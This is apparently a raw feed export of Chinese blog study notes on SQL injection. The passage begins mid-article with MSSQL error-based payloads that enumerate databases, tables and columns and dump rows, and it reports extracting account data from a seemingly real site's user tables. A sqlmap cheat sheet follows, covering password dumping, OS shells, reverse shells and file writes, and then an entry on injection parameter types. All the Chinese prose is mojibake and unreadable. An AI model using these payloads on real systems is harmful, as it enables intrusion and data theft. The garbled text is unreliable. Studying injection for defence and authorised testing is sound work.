(ä¸€ä¸‹3æ¡è¯­å¥å¯ä¾›é€‰æ‹©ä½¿ç”¨) </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. and 1=(select quotename(count(name)) from master..sysdatabases)--</span><br><span class="line">2. and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --</span><br><span class="line">3. and 1=(select str(count and 1=(select quotename(count(name)) from master..sysdatabases where dbid&gt;5)--</span><br><span class="line">   and 1=(select str(count(name))%2b&#x27;|&#x27; from master..sysdatabases where dbid&gt;5) --</span><br><span class="line">   and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) --</span><br><span class="line">è¯´æ˜ï¼šdbidä»1-4çš„æ•°æ®åº“ä¸€èˆ¬ä¸ºç³»ç»Ÿæ•°æ®åº“.</span><br></pre></td></tr></table></figure><p><strong>â‘¤</strong>è·å–æ•°æ®åº“ ï¼ˆè¯¥è¯­å¥æ˜¯ä¸€æ¬¡æ€§è·å–å…¨éƒ¨æ•°æ®åº“çš„ï¼Œä¸”è¯­å¥åªé€‚åˆ&gt;=2005ï¼Œä¸¤æ¡è¯­å¥å¯ä¾›é€‰æ‹©ä½¿ç”¨ï¼‰  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line">and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from master..sysdatabases FOR XML PATH(&#x27;&#x27;))--</span><br></pre></td></tr></table></figure><p><strong>â‘¥</strong>è·å–å½“å‰æ•°æ®åº“ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and db_name()&gt;0</span><br><span class="line">and 1=(select db_name())--</span><br></pre></td></tr></table></figure><p><strong>â‘¦</strong>è·å–å½“å‰æ•°æ®åº“ä¸­çš„è¡¨ï¼ˆæœ‰2ä¸ªè¯­å¥å¯ä¾›é€‰æ‹©ä½¿ç”¨ï¼‰ã€ä¸‹åˆ—è¯­å¥å¯ä¸€æ¬¡çˆ†æ•°æ®åº“æ‰€æœ‰è¡¨ï¼ˆåªé™äºmssql2005åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰ã€‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select quotename(name) from æ•°æ®åº“å..sysobjects where xtype=&#x27;U&#x27; FOR XML PATH(&#x27;&#x27;))-- </span><br><span class="line">and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from æ•°æ®åº“å..sysobjects where xtype=&#x27;U&#x27;  FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line">å¤åˆ¶ä»£ç æµ‹è¯•æ•ˆæœå›¾ï¼šå¾—åˆ°  3ä¸ªæ•æ„Ÿçš„è¡¨ï¼šWhir_Sec_Users/Whir_Mem_Member/Whir_Mem_MemberGroup</span><br></pre></td></tr></table></figure><p><strong>â‘§</strong>è·å¾—è¡¨é‡Œçš„åˆ—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸€æ¬¡çˆ†æŒ‡å®šè¡¨çš„æ‰€æœ‰åˆ—ï¼ˆåªé™äºmssql2005åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰:</span><br><span class="line">and 1=(select quotename(name) from æ•°æ®åº“å..syscolumns where id =(select  id from æ•°æ®åº“å..sysobjects where name=&#x27;æŒ‡å®šè¡¨å&#x27;) FOR XML PATH(&#x27;&#x27;))-- </span><br><span class="line">and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from æ•°æ®åº“å..syscolumns where id =(select  id from æ•°æ®åº“å..sysobjects where name=&#x27;æŒ‡å®šè¡¨å&#x27;) FOR XML PATH(&#x27;&#x27;))--</span><br></pre></td></tr></table></figure><p>æ•ˆæœå›¾ï¼šæ—¢ç„¶æœ‰è´¦æˆ·ä¿¡æ¯ï¼Œæˆ‘å°±ä¸ç®¡æ˜¯ä¸æ˜¯ç®¡ç†å‘˜çš„çš„äº†ï¼Œæˆ‘å¸–å­çš„ç›®çš„ä¸æ˜¯ä¸ºäº†å¾—åˆ°ç®¡ç†å‘˜çš„ä¿¡æ¯ï¼Œåªæ˜¯ä¸ºäº†æ¼”ç¤ºå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–ç›¸å…³ä¿¡æ¯ã€‚</p><p><strong>â‘¨</strong>è·å–æŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨çš„åˆ—çš„æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">é€æ¡çˆ†æŒ‡å®šè¡¨çš„æ‰€æœ‰å­—æ®µçš„æ•°æ®ï¼ˆåªé™äºmssql2005åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰:</span><br><span class="line">and 1=(select top 1 * from æŒ‡å®šæ•°æ®åº“..æŒ‡å®šè¡¨å whereæ’é™¤æ¡ä»¶ FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line"></span><br><span class="line">ä¸€æ¬¡æ€§çˆ†Næ¡æ‰€æœ‰å­—æ®µçš„æ•°æ®ï¼ˆåªé™äºmssql2005åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰:</span><br><span class="line">and 1=(select top N * from æŒ‡å®šæ•°æ®åº“..æŒ‡å®šè¡¨å FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line"></span><br><span class="line">å¤åˆ¶ä»£ç ç¬¬ä¸€æ¡è¯­å¥ï¼š</span><br><span class="line">and 1=(select top 1 * from æŒ‡å®šæ•°æ®åº“..æŒ‡å®šè¡¨å FOR XML  PATH(&#x27;&#x27;))--</span><br><span class="line"></span><br><span class="line">æµ‹è¯•æ•ˆæœå›¾ï¼š----------------------------------</span><br><span class="line">åŠ ä¸Šwhereæ¡ä»¶ç­›é€‰ç»“æœå‡ºæ¥ä¼šæ›´åŠ å¥½ï¼Œ</span><br><span class="line">å¦‚ï¼šwhere and name like &#x27;%user%&#x27; å°±ä¼šç­›é€‰å‡ºå«æœ‰userå…³é”®è¯çš„å‡ºæ¥ã€‚ç”¨åœ¨ç­›é€‰è¡¨æ®µæ—¶å¾ˆä¸é”™ã€‚</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šåœ¨ä½¿ç”¨ä¸€æ¬¡è·å–æ•°æ®åº“ä¿¡æ¯çš„è¯­å¥æ—¶ï¼Œè¯·ä½¿ç”¨ç«ç‹æµè§ˆå™¨ï¼Œç¬”è€…æµ‹è¯•  IE8ã€360æ€¥é€Ÿæµè§ˆå™¨ã€çŒè±¹æµè§ˆå™¨å‡å¡æ­»ï¼Œç«ç‹æµè§ˆå™¨ä¹Ÿä¼šå¯¼è‡´å‡ºç°å‡ ç§’é’Ÿçš„å¡æ­»ï¼Œå¼¹å‡ºæ¡†æ¡†ï¼Œæˆ‘ä»¬ç‚¹å‡»â€œåœæ­¢è„šæœ¬â€å°±ä¼šå¾—åˆ°åˆæ­¥è§£å†³ã€‚ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»å¾—åˆ°äº†è´¦æˆ·ä¿¡æ¯äº†ï¼Œè‡³äºç®¡ç†å‘˜çš„å‘¢ï¼Œå“ˆå“ˆï¼Œå¤§å®¶è‡ªè¡Œæµ‹è¯•æ—¶æ¢è¡¨å•¥çš„å°±å¥½äº†ã€‚</p><h3 id="PostgraSQLæ³¨å…¥åŸç†"><a href="#PostgraSQLæ³¨å…¥åŸç†" class="headerlink" title="PostgraSQLæ³¨å…¥åŸç†"></a>PostgraSQLæ³¨å…¥åŸç†</h3><p>ç›´æ¥å‚è€ƒè¿™ä¸ªï¼Œæ²¡å¿…è¦è®°ä½ï¼Œèƒ½çœ‹æ‡‚å°±è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.webshell.cc/524.html</span><br><span class="line">https://www.cnblogs.com/yilishazi/p/14710349.html</span><br><span class="line">https://www.jianshu.com/p/ba0297da2c2e</span><br></pre></td></tr></table></figure><h3 id="Oracleæ³¨å…¥"><a href="#Oracleæ³¨å…¥" class="headerlink" title="Oracleæ³¨å…¥"></a>Oracleæ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/peterpan0707007/p/8242119.html</span><br></pre></td></tr></table></figure><h3 id="MongoDBæ³¨å…¥"><a href="#MongoDBæ³¨å…¥" class="headerlink" title="MongoDBæ³¨å…¥"></a>MongoDBæ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_33881753/article/details/87981552</span><br><span class="line">https://www.secpulse.com/archives/3278.html</span><br></pre></td></tr></table></figure><h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><h4 id="sqlmapæ”¯æŒçš„æ•°æ®åº“"><a href="#sqlmapæ”¯æŒçš„æ•°æ®åº“" class="headerlink" title="sqlmapæ”¯æŒçš„æ•°æ®åº“"></a>sqlmapæ”¯æŒçš„æ•°æ®åº“</h4><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybaseå’ŒSAP MaxDB</p><h4 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">åŸºæœ¬æ“ä½œç¬”è®°ï¼š-u  #æ³¨å…¥ç‚¹ </span><br><span class="line">-f  #æŒ‡çº¹åˆ¤åˆ«æ•°æ®åº“ç±»å‹ </span><br><span class="line">-b  #è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ </span><br><span class="line">-p  #æŒ‡å®šå¯æµ‹è¯•çš„å‚æ•°(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #æŒ‡å®šæ•°æ®åº“å </span><br><span class="line">-T &quot;&quot;  #æŒ‡å®šè¡¨å </span><br><span class="line">-C &quot;&quot;  #æŒ‡å®šå­—æ®µ </span><br><span class="line">-s &quot;&quot;  #ä¿å­˜æ³¨å…¥è¿‡ç¨‹åˆ°ä¸€ä¸ªæ–‡ä»¶,è¿˜å¯ä¸­æ–­ï¼Œä¸‹æ¬¡æ¢å¤åœ¨æ³¨å…¥(ä¿å­˜ï¼š-s &quot;xx.log&quot;  æ¢å¤:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #è¦æ‰§è¡Œçš„æµ‹è¯•æ°´å¹³ç­‰çº§ï¼Œé»˜è®¤ä¸º1 </span><br><span class="line">--risk=(0-3)  #æµ‹è¯•æ‰§è¡Œçš„é£é™©ç­‰çº§ï¼Œé»˜è®¤ä¸º1 </span><br><span class="line">--time-sec=(2,5) #å»¶è¿Ÿå“åº”ï¼Œé»˜è®¤ä¸º5 </span><br><span class="line">--data #é€šè¿‡POSTå‘é€æ•°æ® </span><br><span class="line">--columns        #åˆ—å‡ºå­—æ®µ </span><br><span class="line">--current-user   #è·å–å½“å‰ç”¨æˆ·åç§° </span><br><span class="line">--current-db     #è·å–å½“å‰æ•°æ®åº“åç§° </span><br><span class="line">--users          #åˆ—æ•°æ®åº“æ‰€æœ‰ç”¨æˆ· </span><br><span class="line">--passwords      #æ•°æ®åº“ç”¨æˆ·æ‰€æœ‰å¯†ç  </span><br><span class="line">--privileges     #æŸ¥çœ‹ç”¨æˆ·æƒé™(--privileges -U root) </span><br><span class="line">-U               #æŒ‡å®šæ•°æ®åº“ç”¨æˆ· </span><br><span class="line">--dbs            #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ </span><br><span class="line">--tables -D &quot;&quot;   #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨ </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;      #åˆ—å‡ºmysqlæ•°æ®åº“ä¸­çš„userè¡¨çš„æ‰€æœ‰å­—æ®µ </span><br><span class="line">--dump-all            #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨ </span><br><span class="line">--exclude-sysdbs      #åªåˆ—å‡ºç”¨æˆ·è‡ªå·±æ–°å»ºçš„æ•°æ®åº“å’Œè¡¨ </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„å­—æ®µçš„æ•°æ®(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„2-4å­—æ®µçš„æ•°æ® </span><br><span class="line">--dbms    #æŒ‡å®šæ•°æ®åº“(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #æŒ‡å®šç³»ç»Ÿ(Linux,Windows) </span><br><span class="line">-v  #è¯¦ç»†çš„ç­‰çº§(0-6) </span><br><span class="line">    0ï¼šåªæ˜¾ç¤ºPythonçš„å›æº¯ï¼Œé”™è¯¯å’Œå…³é”®æ¶ˆæ¯ã€‚</span><br><span class="line">    1ï¼šæ˜¾ç¤ºä¿¡æ¯å’Œè­¦å‘Šæ¶ˆæ¯ã€‚</span><br><span class="line">    2ï¼šæ˜¾ç¤ºè°ƒè¯•æ¶ˆæ¯ã€‚</span><br><span class="line">    3ï¼šæœ‰æ•ˆè½½è·æ³¨å…¥ã€‚</span><br><span class="line">    4ï¼šæ˜¾ç¤ºHTTPè¯·æ±‚ã€‚</span><br><span class="line">    5ï¼šæ˜¾ç¤ºHTTPå“åº”å¤´ã€‚</span><br><span class="line">    6ï¼šæ˜¾ç¤ºHTTPå“åº”é¡µé¢çš„å†…å®¹</span><br><span class="line">--privileges  #æŸ¥çœ‹æƒé™ </span><br><span class="line">--is-dba      #æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ </span><br><span class="line">--roles       #æšä¸¾æ•°æ®åº“ç”¨æˆ·è§’è‰² </span><br><span class="line">--udf-inject  #å¯¼å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆè·å–ç³»ç»Ÿæƒé™ï¼‰ </span><br><span class="line">--union-check  #æ˜¯å¦æ”¯æŒunion æ³¨å…¥ </span><br><span class="line">--union-cols #union æŸ¥è¯¢è¡¨è®°å½• </span><br><span class="line">--union-test #union è¯­å¥æµ‹è¯• </span><br><span class="line">--union-use  #é‡‡ç”¨union æ³¨å…¥ </span><br><span class="line">--union-tech orderby #unioné…åˆorder by </span><br><span class="line">--data &quot;&quot; #POSTæ–¹å¼æäº¤æ•°æ®(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line">--cookie &quot;ç”¨;å·åˆ†å¼€&quot;      #cookieæ³¨å…¥(--cookies=â€PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=lowâ€) </span><br><span class="line">--referer &quot;&quot;     #ä½¿ç”¨refereræ¬ºéª—(--referer &quot;http://www.baidu.com&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #è‡ªå®šä¹‰user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #ä»£ç†æ³¨å…¥ </span><br><span class="line">--string=&quot;&quot;    #æŒ‡å®šå…³é”®è¯,å­—ç¬¦ä¸²åŒ¹é…. </span><br><span class="line">--threads     #é‡‡ç”¨å¤šçº¿ç¨‹(--threads 3) </span><br><span class="line">--sql-shell    #æ‰§è¡ŒæŒ‡å®šsqlå‘½ä»¤ </span><br><span class="line">--sql-query    #æ‰§è¡ŒæŒ‡å®šçš„sqlè¯­å¥(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #è¯»å–æŒ‡å®šæ–‡ä»¶ </span><br><span class="line">--file-write   #å†™å…¥æœ¬åœ°æ–‡ä»¶(--file-write /test/test.txt --file-dest /var/www/html/1.txt;å°†æœ¬åœ°çš„test.txtæ–‡ä»¶å†™å…¥åˆ°ç›®æ ‡çš„1.txt) </span><br><span class="line">--file-dest    #è¦å†™å…¥çš„æ–‡ä»¶ç»å¯¹è·¯å¾„ </span><br><span class="line">--os-cmd=id    #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ </span><br><span class="line">--os-shell     #ç³»ç»Ÿäº¤äº’shell </span><br><span class="line">--os-pwn       #åå¼¹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploitç»å¯¹è·¯å¾„(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #è¯»å–winç³»ç»Ÿæ³¨å†Œè¡¨ </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #å»¶è¿Ÿè®¾ç½® é»˜è®¤--time-sec=5 ä¸º5ç§’ </span><br><span class="line">-p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #æŒ‡å®šuser-agentæ³¨å…¥ </span><br><span class="line">--eta          #ç›²æ³¨ </span><br><span class="line">/pentest/database/sqlmap/txt/</span><br><span class="line">common-columns.txt  å­—æ®µå­—å…¸  ã€€ </span><br><span class="line">common-outputs.txt</span><br><span class="line">common-tables.txt      è¡¨å­—å…¸</span><br><span class="line">keywords.txt</span><br><span class="line">oracle-default-passwords.txt</span><br><span class="line">user-agents.txt</span><br><span class="line">wordlist.txt</span><br></pre></td></tr></table></figure><h3 id="æ¶‰åŠèµ„æº"><a href="#æ¶‰åŠèµ„æº" class="headerlink" title="æ¶‰åŠèµ„æº"></a>æ¶‰åŠèµ„æº</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/bmjoker/p/9326258.html</span><br><span class="line"></span><br><span class="line">https://github.com/youngyangyang04/NoSQLAttack</span><br><span class="line"></span><br><span class="line">https://github.com/sqlmapproject/sqlmap/zipball/master</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_39936434/category_9103379.html</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/WUJ3OGVQSTIyeXdvbHU2ZmV0MjVDUT09bW96aGUmozhe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>14WEBæ¼æ´--SQLæ³¨å…¥ä¹‹ç±»å‹åŠæäº¤æ³¨å…¥</title>
      <link href="/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨çœŸå® SQL æ³¨å…¥å®‰å…¨æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬ä¸€å®šè¦å…ˆæ˜ç¡®æäº¤æ•°æ®åŠæäº¤æ–¹æ³•åå†è¿›è¡Œæ³¨å…¥ï¼Œå…¶ä¸­æäº¤æ•°æ®ç±»å‹å’Œæäº¤æ–¹æ³•å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æè·å–ï¼Œåç»­å®‰å…¨æµ‹è¯•ä¸­æˆ‘ä»¬ä¹Ÿå¿…é¡»æ»¡è¶³åŒç­‰çš„æ“ä½œæ‰èƒ½è¿›è¡Œæ³¨å…¥ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104686.png" alt="image-20210826171130322"></p><h3 id="ç®€è¦æ˜ç¡®å‚æ•°ç±»å‹"><a href="#ç®€è¦æ˜ç¡®å‚æ•°ç±»å‹" class="headerlink" title="ç®€è¦æ˜ç¡®å‚æ•°ç±»å‹"></a>ç®€è¦æ˜ç¡®å‚æ•°ç±»å‹</h3><p>æ•°å­—ï¼Œå­—ç¬¦ï¼Œæœç´¢ï¼ŒJSON ç­‰</p><h4 id="æ•°å­—å‹"><a href="#æ•°å­—å‹" class="headerlink" title="æ•°å­—å‹"></a>æ•°å­—å‹</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104698.png" alt="image-20210826171444372"></p><p>å¯ä»¥çœ‹åˆ°<code>id=1</code>ï¼Œæ˜¯æ•°å­—å‹</p><h4 id="å­—ç¬¦å‹"><a href="#å­—ç¬¦å‹" class="headerlink" title="å­—ç¬¦å‹"></a>å­—ç¬¦å‹</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104702.png" alt="image-20210826171553422"></p><p> <code>email_id =&#39;Dumb@dhakkan.com&#39;</code>æˆ‘ä»¬å¿…é¡»ç”¨â€™æˆ–è€…â€™â€™åŒ…è£¹ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œå› ä¸ºä»–æ˜¯å­—ç¬¦å‹ã€‚</p><h4 id="ä¾‹å¦‚"><a href="#ä¾‹å¦‚" class="headerlink" title="ä¾‹å¦‚"></a>ä¾‹å¦‚</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$name = $_GET[&#x27;x&#x27;]</span><br><span class="line">$sql = &quot;select * from user where name = &#x27;$name&#x27;&quot;</span><br><span class="line">æˆ‘ä»¬å¦‚æœè¦æ³¨å…¥å°±å¿…é¡»è¿™æ ·å†™</span><br><span class="line">?x=xiaodi&#x27; and 1=1 --+æ­£ç¡®</span><br><span class="line">?x=xiaodi&#x27; and 1=1 --+é”™è¯¯</span><br><span class="line">å¸¦åˆ°æ•°æ®åº“ä¸­</span><br><span class="line">$sql =&quot; select * from user where name = &#x27;xiaodi&#x27; and 1=1 --+&#x27;&quot; æ­£ç¡®</span><br><span class="line">$sql =&quot; select * from user where name = &#x27;xiaodi and 1=1 --+&#x27;&quot; é”™è¯¯</span><br></pre></td></tr></table></figure><h4 id="å¹²æ‰°ç¬¦å·"><a href="#å¹²æ‰°ç¬¦å·" class="headerlink" title="å¹²æ‰°ç¬¦å·"></a>å¹²æ‰°ç¬¦å·</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸€èˆ¬æ˜¯&#x27;,&quot;,%,),&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">&#x27;id&#x27;</span><br><span class="line">&quot;id&quot;</span><br><span class="line">(&#x27;id&#x27;)</span><br><span class="line">(&quot;id&quot;)</span><br><span class="line">&quot;&#x27;id&#x27;&quot;</span><br><span class="line">(&quot;&#x27;id&#x27;&quot;)</span><br><span class="line">(&#x27;&quot;id&quot;&#x27;)</span><br><span class="line">&#x27;%id%&#x27;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="ç®€è¦æ˜ç¡®è¯·æ±‚æ–¹æ³•"><a href="#ç®€è¦æ˜ç¡®è¯·æ±‚æ–¹æ³•" class="headerlink" title="ç®€è¦æ˜ç¡®è¯·æ±‚æ–¹æ³•"></a>ç®€è¦æ˜ç¡®è¯·æ±‚æ–¹æ³•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET,POST,COOKIE,REQUEST,HTTP å¤´ç­‰</span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨networkä¸­æŸ¥çœ‹</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104704.png" alt="image-20210826172933628"></p><h4 id="GETè¯·æ±‚"><a href="#GETè¯·æ±‚" class="headerlink" title="GETè¯·æ±‚"></a>GETè¯·æ±‚</h4><p>ç›´æ¥åœ¨æµè§ˆå™¨åé¢æ·»åŠ å‚æ•°å°±å¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?id=1</span><br></pre></td></tr></table></figure><h4 id="POSTè¯·æ±‚"><a href="#POSTè¯·æ±‚" class="headerlink" title="POSTè¯·æ±‚"></a>POSTè¯·æ±‚</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">éœ€è¦é€šè¿‡POSTè¯·æ±‚æ¥å†™å…¥å‚æ•°</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104533.png" alt="image-20210826173620822" style="zoom:67%;" /><h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">éœ€è¦å°†cookieå†™å…¥è¯·æ±‚å¤´ä¸­æ‰å¯ä»¥ä¼ é€’</span><br><span class="line">cookie:c=xxxxx</span><br></pre></td></tr></table></figure><h4 id="REQUESTè¯·æ±‚"><a href="#REQUESTè¯·æ±‚" class="headerlink" title="REQUESTè¯·æ±‚"></a>REQUESTè¯·æ±‚</h4><p> REQUEST å…¨éƒ¨æ¥æ”¶ï¼Œç½‘ç«™åœ¨è®¿é—®çš„æ—¶å€™ç”±äºæˆ‘ä»¬å¤§å¤šæ•°æ˜¯é»‘ç›’æµ‹è¯•ï¼Œä¸çŸ¥é“å¯¹æ–¹ä»£ç 